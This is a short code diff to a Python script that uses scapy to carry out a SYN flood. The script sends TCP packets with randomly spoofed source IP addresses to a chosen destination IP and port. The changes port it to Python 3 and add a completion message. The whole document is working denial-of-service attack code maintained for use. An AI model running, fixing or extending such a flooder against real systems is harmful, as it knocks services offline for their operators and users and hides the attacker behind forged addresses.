@@ -1,10 +1,10 @@
 import sys
 import random
-from scapy.all import *
+from scapy.all import IP, TCP, send
 
 def syn_flood(ip_destination,port_destination,limit):
 	total = 0
-	print "Enviando Pacotes"
+	print("Enviando Pacotes")
 	for x in range (0,limit):
 		ip_packet = IP()
 		ip_packet.src = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
@@ -20,6 +20,7 @@ def syn_flood(ip_destination,port_destination,limit):
 		print("Source: "+ip_packet.src+":"+str(tcp_packet.sport))
 		send(ip_packet/tcp_packet,verbose=0)
 		total+=1
+	print("All packets sent")
 	
 
 def main():
